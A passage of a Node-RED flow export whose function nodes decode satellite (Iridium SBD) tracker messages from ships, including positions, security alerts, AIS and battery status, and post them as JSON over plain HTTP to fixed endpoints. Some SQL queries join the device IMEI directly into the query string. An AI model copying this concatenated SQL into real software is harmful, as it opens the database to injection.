msg.sbd.sbdLatMin;\n  var lonDeg = msg.sbd.sbdLonDeg;\n  var lonMin = msg.sbd.sbdLonMin;\n  var sbdTimestamp = msg.sbd.sbdTimestamp;\n  var ssasFlag = parseInt(msg.payload.ssas);\n  var gpsFlag = parseInt(msg.payload.gps);\n  \n  var sbdLoc = {\n    orient: orient,\n    latDeg: latDeg,\n    latMin: latMin,\n    lonDeg: lonDeg,\n    lonMin: lonMin,\n    orientMap: orientMap,\n    sbdTimestamp: sbdTimestamp,\n  };\n  // msg.sbdLoc=sbdLoc;\n  \n  var parsedMsg;\n  if (device !== null) {\n      pl = String(hexpl).toUpperCase();\n      plLen = pl.length;\n      if (plLen == 32) {\n          parsedMsg = msgParser(\n              pl,\n              imei,\n              device,\n              sbdLoc,\n              ssasFlag,\n              gpsFlag\n          );  \n      }\n      else if (plLen == 20){\n          parsedMsg = msgParserHardware(\n              pl,\n              imei,\n              device,\n              sbdLoc,\n              ssasFlag,\n              gpsFlag\n          ); \n      }\n  } else {\n      parsedMsg = {\n          postData: { status: \"Device Not Found or Not Registered\" },\n          postUrl: \"http://datalink.cakrawala.id/api/asdfghjkl\",\n      };\n  }\n  // return {\"postdata\":parsedMsg.postData,\"posturl\":parsedMsg.postUrl};\n  msg.parsed = parsedMsg;\n  msg.topic = parsedMsg.topic;\n  msg.headers = {};\n  msg.method = \"POST\";\n  msg.url = parsedMsg.postUrl;\n  msg.headers[\"content-type\"] = \"application/json\";\n  msg.payload = parsedMsg.postData;\n  return msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "x": 160,
        "y": 100,
        "wires": [
            [
                "af828aa5.5d3268"
            ]
        ]
    },
    {
        "id": "7adfee1b.37685",
        "type": "debug",
        "z": "b0f63713.e9dc48",
        "name": "",
        "active": true,
        "tosidebar": true,
        "console": true,
        "tostatus": true,
        "complete": "true",
        "targetType": "full",
        "statusVal": "payload",
        "statusType": "auto",
        "x": 450,
        "y": 300,
        "wires": []
    },
    {
        "id": "964aa56d.519078",
        "type": "function",
        "z": "b0f63713.e9dc48",
        "name": "payloadSwitch",
        "func": "var msgMap = {\n  dataLen: {\n    timestamp: 14,\n    latitude: 10,\n    longitude: 10,\n    mmsi: 10,\n    code: 2,\n    velocity: 6,\n    heading: 4,\n    altitude: 4,\n    bat_lvl: 2,\n    engine_rpm: 4,\n    engine_temp: 4,\n    propeller: 4,\n    flow_out: 4,\n    tank_vol: 1,\n    flow_in: 4,\n    low_bat_status: 2,\n    power_plug_status: 2,\n  },\n  FE: {\n    data: [\n      \"timestamp\",\n      \"latitude\",\n      \"longitude\",\n      \"velocity\",\n      \"heading\",\n      \"altitude\",\n      \"bat_lvl\",\n    ],\n    table: \"tracking\",\n    type: \"8\",\n  },\n  FD: {\n    data: [\"timestamp\", \"latitude\", \"longitude\"],\n    table: \"tracking\",\n    type: \"9\",\n  },\n  FB: {\n    data: [\"timestamp\", \"latitude\", \"longitude\"],\n    table: \"tracking\",\n    type: \"7\",\n  },\n  FA: {\n    data: [\"mmsi\", \"latitude\", \"longitude\"],\n    table: \"ais_dynamic\",\n    type: \"AIS Data\",\n  },\n  //   80: {\n  //     data: [\n  //       \"code\",\n  //       \"timestamp\",\n  //       \"latitude\",\n  //       \"longitude\",\n  //       \"velocity\",\n  //       \"heading\",\n  //       \"altitude\",\n  //       \"bat_lvl\",\n  //     ],\n  //     table: [\n  //       \"ssas\",\n  //       \"tracking\",\n  //       \"tracking\",\n  //       \"tracking\",\n  //       \"tracking\",\n  //       \"tracking\",\n  //       \"tracking\",\n  //       \"tracking\",\n  //     ],\n  //     type: \"SSAS\",\n  //   },\n  80: {\n    data: [\n      \"timestamp\",\n      \"latitude\",\n      \"longitude\",\n      \"velocity\",\n      \"heading\",\n      \"altitude\",\n      \"bat_lvl\",\n    ],\n    table: \"tracking\",\n    // type: \"SSAS\",\n    type: \"4\",\n  },\n  801: {\n    data: [\n      \"timestamp\",\n      \"latitude\",\n      \"longitude\",\n      \"velocity\",\n      \"heading\",\n      \"altitude\",\n      \"bat_lvl\",\n    ],\n    table: \"tracking\",\n    type: \"ssas_msg\",\n  },\n  90: {\n    data: [\"timestamp\", \"latitude\", \"longitude\"],\n    table: \"tracking\",\n    type: \"6\",\n  },\n  81: {\n    data: [\n      \"timestamp\",\n      \"latitude\",\n      \"longitude\",\n      \"velocity\",\n      \"heading\",\n      \"altitude\",\n      \"bat_lvl\",\n    ],\n    table: \"tracking\",\n    type: \"1\",\n  },\n  82: {\n    data: [\n      \"timestamp\",\n      \"latitude\",\n      \"longitude\",\n      \"velocity\",\n      \"heading\",\n      \"altitude\",\n      \"bat_lvl\",\n      \"engine_rpm\",\n      \"engine_temp\",\n      \"propeller\",\n    ],\n    table: [\"engine_rpm\", \"engine_temp\", \"engine_propeller\"],\n    type: \"2\",\n  },\n  83: {\n    data: [\n      \"timestamp\",\n      \"latitude\",\n      \"longitude\",\n      \"velocity\",\n      \"heading\",\n      \"altitude\",\n      \"bat_lvl\",\n      \"flow_out\",\n      \"tank_vol\",\n      \"flow_in\",\n    ],\n    table: \"data_fuel\",\n    type: \"3\",\n  },\n  //   84: {\n  //     data: [\n  //       \"code\",\n  //       \"timestamp\",\n  //       \"latitude\",\n  //       \"longitude\",\n  //       \"velocity\",\n  //       \"heading\",\n  //       \"altitude\",\n  //       \"bat_lvl\",\n  //     ],\n  //     table: [\n  //       \"ssas\",\n  //       \"tracking\",\n  //       \"tracking\",\n  //       \"tracking\",\n  //       \"tracking\",\n  //       \"tracking\",\n  //       \"tracking\",\n  //       \"tracking\",\n  //     ],\n  //     type: \"10\",\n  //   },\n  84: {\n    data: [\n      \"timestamp\",\n      \"latitude\",\n      \"longitude\",\n      \"velocity\",\n      \"heading\",\n      \"altitude\",\n      \"bat_lvl\",\n    ],\n    table: \"tracking\",\n    type: \"10\",\n  },\n  85: {\n    data: [\n        \"timestamp\", \n        \"latitude\", \n        \"longitude\", \n        \"bat_lvl\"\n    ],\n    table: \"tracking\",\n    type: \"11\",\n  },\n  86: {\n    data: [\n      \"power_plug_status\",\n      \"timestamp\",\n      \"latitude\",\n      \"longitude\",\n      \"velocity\",\n      \"heading\",\n      \"altitude\",\n      \"bat_lvl\",\n    ],\n    table: \"tracking\",\n    type: \"\",\n  },\n  87: {\n    data: [\n      \"low_bat_status\",\n      \"timestamp\",\n      \"latitude\",\n      \"longitude\",\n      \"velocity\",\n      \"heading\",\n      \"altitude\",\n      \"bat_lvl\",\n    ],\n    table: \"tracking\",\n    type: \"\",\n  },\n};\n\nvar pingCmd = [\"FE\", \"FD\", \"FB\", \"81\", \"85\", \"90\"];\n\nvar orientMap = {\n  0: { lat: \"1\", lon: \"1\" },\n  1: { lat: \"1\", lon: \"0\" },\n  2: { lat: \"0\", lon: \"1\" },\n  3: { lat: \"0\", lon: \"0\" },\n};\n\nfunction parse(submsg, param, parLen, subindex) {\n  var msg = submsg.substring(subindex, parLen);\n  switch (param) {\n    case \"timestamp\":\n      var y = msg.substring(0, 4);\n      var m = msg.substring(4, 6);\n      var d = msg.substring(6, 8);\n      var H = msg.substring(8, 10);\n      var i = msg.substring(10, 12);\n      var s = msg.substring(12, 14);\n      return y + \"-\" + m + \"-\" + d + \" \" + H + \":\" + i + \":\" + s;\n    case \"latitude\":\n      var negatif = msg.substring(0, 1);\n      var decNum = msg.substring(1, 4);\n      var afterDec = msg.substring(4, 10);\n      var neg = \"\";\n      if (negatif == \"0\") {\n        neg = \"-\";\n      }\n      return parseFloat(neg + decNum + \".\" + afterDec);\n    case \"longitude\":\n      negatif = msg.substring(0, 1);\n      decNum = msg.substring(1, 4);\n      afterDec = msg.substring(4, 10);\n      neg = \"\";\n      if (negatif == \"0\") {\n        neg = \"-\";\n      }\n      return parseFloat(neg + decNum + \".\" + afterDec);\n    case \"velocity\":\n      negatif = msg.substring(0, 1);\n      decNum = msg.substring(1, 3);\n      afterDec = msg.substring(3, 6);\n      neg = \"\";\n      if (negatif == \"0\") {\n        neg = \"-\";\n      }\n      return parseFloat(neg + decNum + \".\" + afterDec);\n    case \"heading\":\n      decNum = msg.substring(0, 3);\n      afterDec = msg.substring(3, 4);\n      return parseFloat(decNum + \".\" + afterDec);\n    case \"altitude\":\n      negatif = msg.substring(0, 1);\n      decNum = msg.substring(1, 3);\n      afterDec = msg.substring(3, 4);\n      neg = \"\";\n      if (negatif == \"0\") {\n        neg = \"-\";\n      }\n      return parseFloat(neg + decNum + \".\" + afterDec);\n    case \"bat_lvl\":\n      return parseFloat(msg);\n    case \"mmsi\":\n      return msg.substring(1, 10);\n    case \"code\":\n      return parseInt(msg);\n    case \"power_plug_status\":\n      return String(msg);\n    case \"low_bat_status\":\n      return String(msg);\n  }\n}\n\nfunction locParser(imei, device, cid, msg, msgMap) {\n  var result = {\n    postData: {},\n    postUrl: \"http://139.180.134.99/api/periodicposition\",\n    parser: \"locParser\",\n  };\n  \n  var msgData = msgMap[cid][\"data\"];\n  var table = msgMap[cid][\"table\"];\n  var msgType = msgMap[cid][\"type\"];\n  result.postData[table + \"_device_imei\"] = imei;\n  result.postData[table + \"_asset_id\"] = device.asset_id;\n  var lastIndex = 0;\n  for (var i = 0; i < msgData.length; i++) {\n    var parLen = msgMap[\"dataLen\"][msgData[i]] + lastIndex;\n    var parsed = parse(msg, msgData[i], parLen, lastIndex);\n    if (msgData[i] == \"timestamp\") {\n      result.postData[table + \"_created_at\"] = parsed;\n      result.postData[table + \"_updated_at\"] = parsed;\n    } else {\n      result.postData[table + \"_\" + [msgData[i]]] = parsed;\n    }\n    // result.postData[table + \"_type_id\"] = msgType;\n    lastIndex = parLen;\n  }\n  var splitType=msgType.split(\",\");\n  if(splitType.length>1){\n      result.postData[table + \"_type_id\"] = splitType[0];\n      result.postData[table + \"_status\"] = splitType[1];\n  }else{\n      result.postData[table + \"_type_id\"] = msgType;\n  }\n  return result;\n}\n\n// function ssasParser(imei, device, cid, msg, msgMap, ssasFlag) {\n//   var result = {\n//     postData: {},\n//     postUrl: \"http://139.180.134.99/api/ssasreply\",\n//     parser: \"ssasParser\",\n//   };\n//   if (ssasFlag > 0) {\n//     cid = 801;\n//   }\n//   var msgData = msgMap[cid][\"data\"];\n//   var table = msgMap[cid][\"table\"];\n//   var msgType = msgMap[cid][\"type\"];\n//   if (cid == 80) {\n//     result.postData[table[1] + \"_device_imei\"] = imei;\n//     result.postData[table[1] + \"_asset_id\"] = device.asset_id;\n//     var lastIndex = 0;\n//     for (var i = 0; i < msgData.length; i++) {\n//       var parLen = msgMap[\"dataLen\"][msgData[i]] + lastIndex;\n//       var parsed = parse(msg, msgData[i], parLen, lastIndex);\n//       if (msgData[i] == \"timestamp\") {\n//         result.postData[table[0] + \"_created_at\"] = parsed;\n//         result.postData[table[0] + \"_updated_at\"] = parsed;\n//         result.postData[table[1] + \"_created_at\"] = parsed;\n//         result.postData[table[1] + \"_updated_at\"] = parsed;\n//       } else {\n//         result.postData[table[i] + \"_\" + [msgData[i]]] = parsed;\n//       }\n//       lastIndex = parLen;\n//     }\n//     if (result.postData[table[0] + \"_code\"] == 1) {\n//       result.postData[table[1] + \"_type_id\"] = 4;\n//     } else {\n//       result.postData[table[1] + \"_type_id\"] = 5;\n//     }\n//     // flow.set(\"ssas\", result.postData[table[0] + '_code']);\n//   } else {\n//     result.postData[table + \"_device_imei\"] = imei;\n//     result.postData[table + \"_asset_id\"] = device.asset_id;\n//     var lastIndex = 0;\n//     for (var i = 0; i < msgData.length; i++) {\n//       var parLen = msgMap[\"dataLen\"][msgData[i]] + lastIndex;\n//       var parsed = parse(msg, msgData[i], parLen, lastIndex);\n//       if (msgData[i] == \"timestamp\") {\n//         result.postData[table + \"_created_at\"] = parsed;\n//         result.postData[table + \"_updated_at\"] = parsed;\n//       } else {\n//         result.postData[table + \"_\" + [msgData[i]]] = parsed;\n//       }\n//       if (ssasFlag == 1) {\n//         result.postData[table + \"_type_id\"] = 4;\n//       } else {\n//         result.postData[table + \"_type_id\"] = 5;\n//       }\n\n//       lastIndex = parLen;\n//     }\n//     result.postUrl = \"http://139.180.134.99/api/periodicposition\";\n//   }\n//   return result;\n// }\n\n// function ssasReset(imei, device, cid, msg, msgMap) {\n//   var result = {\n//     postData: {},\n//     postUrl: \"http://139.180.134.99/api/solve\",\n//     parser: \"ssasReset\",\n//   };\n//   var msgData = msgMap[cid][\"data\"];\n//   var table = msgMap[cid][\"table\"];\n//   var msgType = msgMap[cid][\"type\"];\n//   result.postData[table[1] + \"_device_imei\"] = imei;\n//   result.postData[table[1] + \"_asset_id\"] = device.asset_id;\n//   var lastIndex = 0;\n//   for (var i = 0; i < msgData.length; i++) {\n//     var parLen = msgMap[\"dataLen\"][msgData[i]] + lastIndex;\n//     var parsed = parse(msg, msgData[i], parLen, lastIndex);\n//     if (msgData[i] == \"timestamp\") {\n//       result.postData[table[0] + \"_updated_at\"] = parsed;\n//       result.postData[table[1] + \"_updated_at\"] = parsed;\n//     } else {\n//       result.postData[table[i] + \"_\" + [msgData[i]]] = parsed;\n//     }\n//     result.postData[table[1] + \"_type_id\"] = msgType;\n//     lastIndex = parLen;\n//   }\n//   return result;\n// }\n\nfunction ssasParser(imei, device, cid, msg, msgMap, ssasFlag) {\n  var result = {\n    postData: {},\n    postUrl: \"http://139.180.134.99/api/ssasreply\",\n    parser: \"ssasParser\",\n  };\n  var msgData = msgMap[cid][\"data\"];\n  var table = msgMap[cid][\"table\"];\n  var msgType = msgMap[cid][\"type\"];\n  result.postData[table + \"_device_imei\"] = imei;\n  result.postData[table + \"_asset_id\"] = device.asset_id;\n  var lastIndex = 0;\n  for (var i = 0; i < msgData.length; i++) {\n    var parLen = msgMap[\"dataLen\"][msgData[i]] + lastIndex;\n    var parsed = parse(msg, msgData[i], parLen, lastIndex);\n    if (msgData[i] == \"timestamp\") {\n      result.postData[table + \"_created_at\"] = parsed;\n      result.postData[table + \"_updated_at\"] = parsed;\n    } else {\n      result.postData[table + \"_\" + [msgData[i]]] = parsed;\n    }\n    lastIndex = parLen;\n  }\n//   result.postData[table + \"_type_id\"] = 4;\n  var splitType=msgType.split(\",\");\n  if(splitType.length>1){\n      result.postData[table + \"_type_id\"] = splitType[0];\n      result.postData[table + \"_status\"] = splitType[1];\n  }else{\n      result.postData[table + \"_type_id\"] = msgType;\n  }\n  \n\n  //   result.postUrl = \"http://139.180.134.99/api/periodicposition\";\n  return result;\n}\n\nfunction ssasReset(imei, device, cid, msg, msgMap) {\n  var result = {\n    postData: {},\n    postUrl: \"http://139.180.134.99/api/solve\",\n    parser: \"ssasReset\",\n  };\n  var msgData = msgMap[cid][\"data\"];\n  var table = msgMap[cid][\"table\"];\n  var msgType = msgMap[cid][\"type\"];\n  result.postData[table + \"_device_imei\"] = imei;\n  result.postData[table + \"_asset_id\"] = device.asset_id;\n  var lastIndex = 0;\n  for (var i = 0; i < msgData.length; i++) {\n    var parLen = msgMap[\"dataLen\"][msgData[i]] + lastIndex;\n    var parsed = parse(msg, msgData[i], parLen, lastIndex);\n    if (msgData[i] == \"timestamp\") {\n      result.postData[table + \"_updated_at\"] = parsed;\n    } else {\n      result.postData[table + \"_\" + [msgData[i]]] = parsed;\n    }\n    result.postData[table + \"_type_id\"] = msgType;\n    lastIndex = parLen;\n  }\n  return result;\n}\n\nfunction plugParser(imei, device, cid, msg, msgMap) {\n  var result = {\n    postData: {},\n    postUrl: \"http://139.180.134.99/api/periodicposition\",\n    parser: \"plugParser\",\n  };\n  var msgData = msgMap[cid][\"data\"];\n  var table = msgMap[cid][\"table\"];\n  var msgType = msgMap[cid][\"type\"];\n  result.postData[table + \"_device_imei\"] = imei;\n  result.postData[table + \"_asset_id\"] = device.asset_id;\n  var lastIndex = 0;\n  for (var i = 0; i < msgData.length; i++) {\n    var parLen = msgMap[\"dataLen\"][msgData[i]] + lastIndex;\n    var parsed = parse(msg, msgData[i], parLen, lastIndex);\n    if (msgData[i] == \"timestamp\") {\n      result.postData[table + \"_created_at\"] = parsed;\n      result.postData[table + \"_updated_at\"] = parsed;\n    } else {\n      result.postData[table + \"_\" + [msgData[i]]] = parsed;\n    }\n    result.postData[table + \"_type_id\"] = msgType;\n    lastIndex = parLen;\n  }\n  if (result.postData[table + \"_power_plug_status\"] == \"0\") {\n    result.postData[table + \"_type_id\"] = 16;\n  } else if (result.postData[table + \"_power_plug_status\"] == \"40\") {\n    result.postData[table + \"_type_id\"] = 15;\n  } else if (result.postData[table + \"_power_plug_status\"] == \"80\") {\n    result.postData[table + \"_type_id\"] = 13;\n  } else if (result.postData[table + \"_power_plug_status\"] == \"C0\") {\n    result.postData[table + \"_type_id\"] = 17;\n  }\n  delete result.postData[table + \"_power_plug_status\"];\n  return result;\n}\n\nfunction lowBattParser(imei, device, cid, msg, msgMap) {\n  var result = {\n    postData: {},\n    postUrl: \"http://139.180.134.99/api/periodicposition\",\n    parser: \"lowBattParser\",\n  };\n  var msgData = msgMap[cid][\"data\"];\n  var table = msgMap[cid][\"table\"];\n  var msgType = msgMap[cid][\"type\"];\n  result.postData[table + \"_device_imei\"] = imei;\n  result.postData[table + \"_asset_id\"] = device.asset_id;\n  var lastIndex = 0;\n  for (var i = 0; i < msgData.length; i++) {\n    var parLen = msgMap[\"dataLen\"][msgData[i]] + lastIndex;\n    var parsed = parse(msg, msgData[i], parLen, lastIndex);\n    if (msgData[i] == \"timestamp\") {\n      result.postData[table + \"_created_at\"] = parsed;\n      result.postData[table + \"_updated_at\"] = parsed;\n    } else {\n      result.postData[table + \"_\" + [msgData[i]]] = parsed;\n    }\n    result.postData[table + \"_type_id\"] = msgType;\n    lastIndex = parLen;\n  }\n  if (result.postData[table + \"_low_bat_status\"] == \"40\") {\n    result.postData[table + \"_type_id\"] = 19;\n  } else if (result.postData[table + \"_low_bat_status\"] == \"80\") {\n    result.postData[table + \"_type_id\"] = 18;\n  } else if (result.postData[table + \"_low_bat_status\"] == \"C0\") {\n    result.postData[table + \"_type_id\"] = 20;\n  }\n  delete result.postData[table + \"_low_bat_status\"];\n  return result;\n}\n\nfunction aisParser(imei, cid, msg, msgMap) {\n  var result = {\n    postData: {},\n    postUrl: \"http://139.180.134.99/api/aisdynamic\",\n    parser: \"aisParser\",\n  };\n  var msgData = msgMap[cid][\"data\"];\n  var table = msgMap[cid][\"table\"];\n  var msgType = msgMap[cid][\"type\"];\n  // result.postData[table + '_station_id'] = imei;\n  // console.log(msgData);\n  var arr = [];\n  for (var h = 0; h < 10; h++) {\n    var pushMsg = msg.substring(h * 30, h * 30 + 30);\n    if (pushMsg !== \"\") {\n      arr.push(pushMsg);\n    }\n  }\n  // console.log(\"arrlength\",arr.length);\n  for (var i = 0; i < arr.length; i++) {\n    result.postData[i] = {};\n    if (arr[i] !== \"\") {\n      console.log(arr[i]);\n      result.postData[i][table + \"_station_id\"] = imei;\n      var lastIndex = 0;\n      for (var j = 0; j < msgData.length; j++) {\n        var parLen = msgMap[\"dataLen\"][msgData[j]] + lastIndex;\n        var parsed = parse(arr[i], msgData[j], parLen, lastIndex);\n        if (msgData[j] == \"timestamp\") {\n          result.postData[i][table + \"_created_at\"] = parsed;\n          result.postData[i][table + \"_updated_at\"] = parsed;\n        } else {\n          result.postData[i][table + \"_\" + [msgData[j]]] = parsed;\n        }\n        lastIndex = parLen;\n        // console.log(result.postData);\n      }\n    }\n  }\n  return result;\n}\n\nfunction msgParser(\n  msg,\n  msgMap,\n  imei,\n  device,\n  pingCmd,\n  sbdLoc,\n  ssasFlag,\n  gpsFlag\n) {\n  // var msgLength = msg.substring(0, 4);\n  var result;\n  var parser;\n  var cid = msg.substring(4, 6);\n  if (cid == \"85\") {\n    // flow.set(\"gps\", false);\n    gpsFlag = 0;\n  }\n  var restructed = restruct(msg, msgMap, cid, sbdLoc, ssasFlag, gpsFlag);\n  msg = restructed.msg;\n  if (pingCmd.includes(cid)) {\n    result = locParser(imei, device, cid, msg.substring(6), msgMap);\n  } else {\n    switch (cid) {\n      case \"FA\":\n        if(msg.length>6){\n            result = aisParser(imei, cid, msg.substring(6), msgMap);\n            // result = {postData:{\"imei\": imei, \"payload\": msg}, postUrl: \"http://139.180.134.99/api/parserais\", parser: \"php\"};\n        }else{\n            var zeroData = {\n                postData: {\"imei\": imei},\n                postUrl:\"http://139.180.134.99/api/aiskosong\",\n                parser: \"aisEmpty\"\n            }\n            result = zeroData;\n        }\n        break;\n      case \"80\":\n        result = ssasParser(\n          imei,\n          device,\n          cid,\n          msg.substring(6),\n          msgMap,\n          ssasFlag\n        );\n        break;\n      // case \"82\":\n      //     result = engineParser(imei, device, cid, msg.substring(6), msgMap);\n      // case \"83\":\n      //     result = flowParser(imei, device, cid, msg.substring(6), msgMap);\n      case \"84\":\n        result = ssasReset(imei, device, cid, msg.substring(6), msgMap);\n        break;\n      case \"86\":\n        result = plugParser(imei, device, cid, msg.substring(6), msgMap);\n        break;\n      case \"87\":\n        result = lowBattParser(imei, device, cid, msg.substring(6), msgMap);\n        break;\n    }\n  }\n  // result.restructed = restructed;\n  result.cid = cid;\n  result.topic =\n    \"UPDATE node_flags set gps=\" +\n    String(restructed.gpsFlag) +\n    \", ssas=\" +\n    String(restructed.ssasFlag) +\n    \" where imei='\" +\n    String(imei) +\n    \"'\";\n  // result.sbdLoc=sbdLoc;\n  return result;\n}\n\nfunction restruct(msg, msgMap, cid, sbdLoc, ssasFlag, gpsFlag) {\n  var arrCid = [\"FA\", \"86\", \"87\"];\n  var arrLoc = [\"80\", \"81\", \"84\"];\n  var pre, pl;\n  var msgData = msgMap[cid][\"data\"];\n  var msgLength = parseInt(msg.substring(0, 2), 16) * 2;\n  var trueLength = 0;\n  // if(!flow.get(\"gps\")){\n  if (cid == \"FA\") {\n      if(msgLength===2){\n          return { msg: msg, gpsFlag: gpsFlag, ssasFlag: ssasFlag };\n      }\n  }\n  if (cid == \"84\" || cid == 84) {\n    ssasFlag = 0;\n  }\n  if (cid == \"80\" || cid == 80) {\n    if (!ssasFlag || ssasFlag == \"0\") {\n    //   ssasFlag = parseInt(msg.substring(6, 8));\n      ssasFlag = 1;\n    }\n  }\n  if(msgLength===18){\n      gpsFlag=0;\n  }\n  if (!gpsFlag) {\n    for (var i = 0; i < msgData.length; i++) {\n      trueLength = trueLength + msgMap.dataLen[msgData[i]];\n    }\n    trueLength = trueLength + 2;\n    if (msgLength == trueLength) {\n      // flow.set(\"gps\",1);\n      gpsFlag = 1;\n      return { msg: msg, gpsFlag: gpsFlag, ssasFlag: ssasFlag };\n    } else {\n      if (arrCid.includes(cid)) {\n        pre = msg.substring(0, 22);\n        pl = msg.substring(22);\n      } else {\n        pre = msg.substring(0, 20);\n        pl = msg.substring(20);\n      }\n      var latOrient = sbdLoc.orientMap[String(sbdLoc.orient)].lat;\n      var lonOrient = sbdLoc.orientMap[String(sbdLoc.orient)].lon;\n      var latDeg = sbdLoc.latDeg;\n      var lonDeg = sbdLoc.lonDeg;\n      if (latDeg < 10) {\n        latDeg = \"00\" + String(latDeg);\n      } else if (latDeg > 10) {\n        latDeg = \"0\" + String(latDeg);\n      }\n      if (lonDeg < 10) {\n        lonDeg = \"00\" + String(lonDeg);\n      } else if (lonDeg > 10 && lonDeg < 100) {\n        lonDeg = \"0\" + String(lonDeg);\n      } else if (lonDeg >= 100) {\n        lonDeg = String(lonDeg);\n      }\n      var sbdLat = String(latOrient) + String(latDeg) + String(latMin);\n      var sbdLon = String(lonOrient) + String(lonDeg) + String(lonMin);\n      if (sbdLat.length < 10) {\n        for (var j = 0; j < 10 - sbdLat.length; j++) {\n          sbdLat += \"0\";\n        }\n      }\n      if (sbdLon.length < 10) {\n        for (var k = 0; k < 10 - sbdLat.length; k++) {\n          sbdLat += \"0\";\n        }\n      }\n      if(arrLoc.includes(cid)){\n          var sha=\"\";\n          for(var l=0;l<15;l++){\n              sha+=\"0\";\n          }\n          msg = pre + sbdLat + sbdLon + sha +pl;\n          msgMap[cid][\"type\"]+=\",11\";\n      }else{\n          msg = pre + sbdLat + sbdLon + pl;\n      }\n      \n      return { msg: msg, gpsFlag: gpsFlag, ssasFlag: ssasFlag };\n    }\n  } else {\n    return { msg: msg, gpsFlag: gpsFlag, ssasFlag: ssasFlag };\n  }\n}\n\n// return msg;\nvar hexpl = msg.sbd.hexpayload;\nvar imei = msg.sbd.imei;\nvar device = msg.payload.message;\n// var sbdpl = msg.payload.sbdpayload;\nvar orient = msg.sbd.sbdOrient;\nvar latDeg = msg.sbd.sbdLatDeg;\nvar latMin = msg.sbd.sbdLatMin;\nvar lonDeg = msg.sbd.sbdLonDeg;\nvar lonMin = msg.sbd.sbdLonMin;\nvar ssasFlag = parseInt(msg.payload.ssas);\nvar gpsFlag = parseInt(msg.payload.gps);\n// var ssasFlag = 0;\n// var gpsFlag = 1;\n\nvar sbdLoc = {\n  orient: orient,\n  latDeg: latDeg,\n  latMin: latMin,\n  lonDeg: lonDeg,\n  lonMin: lonMin,\n  orientMap: orientMap,\n};\n// msg.sbdLoc=sbdLoc;\n\nvar parsedMsg;\nif (device !== null) {\n  pl = hexpl.toUpperCase();\n  parsedMsg = msgParser(\n    pl,\n    msgMap,\n    imei,\n    device,\n    pingCmd,\n    sbdLoc,\n    ssasFlag,\n    gpsFlag\n  );\n} else {\n  parsedMsg = {\n    postData: { status: \"Device Not Found or Not Registered\" },\n    postUrl: \"http://139.180.134.99/api/asdfghjkl\",\n  };\n}\n// return {\"postdata\":parsedMsg.postData,\"posturl\":parsedMsg.postUrl};\nmsg.parsed = parsedMsg;\nmsg.topic = parsedMsg.topic;\nmsg.headers = {};\nmsg.method = \"POST\";\nmsg.url = parsedMsg.postUrl;\nmsg.headers[\"content-type\"] = \"application/json\";\nmsg.payload = parsedMsg.postData;\nreturn msg;\n",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "x": 200,
        "y": 180,
        "wires": [
            [
                "78c13832.d9e298"
            ]
        ]
    },
    {
        "id": "c412e651.4ba3a8",
        "type": "http request",
        "z": "b0f63713.e9dc48",
        "name": "",
        "method": "use",
        "ret": "obj",
        "paytoqs": "ignore",
        "url": "",
        "tls": "",
        "persist": false,
        "proxy": "",
        "authType": "",
        "x": 190,
        "y": 260,
        "wires": [
            [
                "7adfee1b.37685"
            ]
        ]
    },
    {
        "id": "53374803.8b0cf8",
        "type": "json",
        "z": "b0f63713.e9dc48",
        "name": "",
        "property": "payload",
        "action": "obj",
        "pretty": false,
        "x": 310,
        "y": 220,
        "wires": [
            [
                "c412e651.4ba3a8"
            ]
        ]
    },
    {
        "id": "f50ec0c4.613b6",
        "type": "status",
        "z": "b0f63713.e9dc48",
        "name": "",
        "scope": [
            "afb1aab4.2390d8"
        ],
        "x": 180,
        "y": 300,
        "wires": [
            [
                "7adfee1b.37685"
            ]
        ]
    },
    {
        "id": "24f9bd06.5bd402",
        "type": "change",
        "z": "b0f63713.e9dc48",
        "name": "setMsgPl",
        "rules": [
            {
                "t": "set",
                "p": "topic",
                "pt": "msg",
                "to": "\"SELECT * FROM node_flags where imei='\"&msg.payload.imei&\"';\"",
                "tot": "jsonata"
            },
            {
                "t": "set",
                "p": "rcv.payload",
                "pt": "msg",
                "to": "payload",
                "tot": "msg"
            }
        ],
        "action": "",
        "property": "",
        "from": "",
        "to": "",
        "reg": false,
        "x": 140,
        "y": 40,
        "wires": [
            [
                "a62b845f.b0f328"
            ]
        ]
    },
    {
        "id": "6c37748a.b7a9cc",
        "type": "change",
        "z": "b0f63713.e9dc48",
        "name": "restruct",
        "rules": [
            {
                "t": "set",
                "p": "rcv.payload.gps",
                "pt": "msg",
                "to": "payload[0].gps",
                "tot": "msg"
            },
            {
                "t": "set",
                "p": "rcv.payload.ssas",
                "pt": "msg",
                "to": "payload[0].ssas",
                "tot": "msg"
            },
            {
                "t": "set",
                "p": "payload",
                "pt": "msg",
                "to": "rcv.payload",
                "tot": "msg"
            },
            {
                "t": "delete",
                "p": "topic",
                "pt": "msg"
            },
            {
                "t": "delete",
                "p": "rcv",
                "pt": "msg"
            }
        ],
        "action": "",
        "property": "",
        "from": "",
        "to": "",
        "reg": false,
        "x": 420,
        "y": 40,
        "wires": [
            [
                "964aa56d.519078"
            ]
        ]
    },
    {
        "id": "78c13832.d9e298",
        "type": "change",
        "z": "b0f63713.e9dc48",
        "name": "remTopic",
        "rules": [
            {
                "t": "delete",
                "p": "topic",
                "pt": "msg"
            }
        ],
        "action": "",
        "property": "",
        "from": "",
        "to": "",
        "reg": false,
        "x": 180,
        "y": 220,
        "wires": [
            [
                "53374803.8b0cf8"
            ]
        ]
    },
    {
        "id": "f14177cb.7d20a8",
        "type": "debug",
        "z": "b0f63713.e9dc48",
        "name": "",
        "active": true,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "true",
        "targetType": "full",
        "statusVal": "",
        "statusType": "auto",
        "x": 610,
        "y": 240,
        "wires": []
    },
    {
        "id": "a62b845f.b0f328",
        "type": "debug",
        "z": "b0f63713.e9dc48",
        "name": "",
        "active": true,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "true",
        "targetType": "full",
        "statusVal": "",
        "statusType": "auto",
        "x": 170,
        "y": 100,
        "wires": []
    },
    {
        "id": "0507e3472f370359",
        "type": "function",
        "z": "e289fbbf20048294",
        "name": "",
